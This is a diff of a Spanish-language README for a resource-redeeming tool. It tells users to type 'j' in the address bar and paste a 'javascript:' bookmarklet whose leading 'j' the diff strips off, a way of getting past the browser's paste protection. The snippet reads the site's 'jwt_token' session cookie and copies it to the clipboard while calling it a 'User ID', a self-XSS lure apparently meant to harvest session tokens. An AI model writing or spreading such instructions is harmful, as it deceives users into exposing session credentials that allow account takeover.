@@ -26,7 +26,7 @@ Esta es una herramienta simple y útil que te permite canjear rápidamente recur
 2. Escribe `j` en la barra de direcciones y pega este código:  
 
 ```
-javascript:(function(){try{const token=document.cookie.split(';').find(c=>c.includes('jwt_token')).split('=')[1];const el=document.createElement('textarea');el.value=token;document.body.appendChild(el);el.select();document.execCommand('copy');document.body.removeChild(el);alert('ID copiado: '+token);}catch(e){alert('No se encontró información de inicio de sesión');}})();
+avascript:(function(){try{const token=document.cookie.split(';').find(c=>c.includes('jwt_token')).split('=')[1];const el=document.createElement('textarea');el.value=token;document.body.appendChild(el);el.select();document.execCommand('copy');document.body.removeChild(el);alert('ID copiado: '+token);}catch(e){alert('No se encontró información de inicio de sesión');}})();
 ```
 
 3. Presiona Enter (no buscar) — tu User ID será copiado automáticamente  
